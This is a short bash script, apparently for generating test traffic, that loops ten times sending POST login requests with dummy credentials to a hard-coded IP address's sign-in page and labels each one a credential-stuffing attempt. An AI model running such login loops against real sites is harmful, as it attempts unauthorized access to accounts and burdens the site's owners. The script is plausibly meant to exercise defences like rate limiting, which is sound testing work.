# for run in {1..10}
# do
#   echo "Running commands against website Address - $1"
#   curl -s "$1" -i -X POST -d "username=1&password=1"
#   sleep 10
#   echo CURL Credential Stuffing attempt "$run" done
#   sleep 2
# done

for run in {1..10}
do
  curl -s "http://34.169.188.2/user/signin" -i -X POST -d "username=1&password=1"
  echo
  echo CURL Credential Stuffing attempt "$run" done
  sleep 2
done
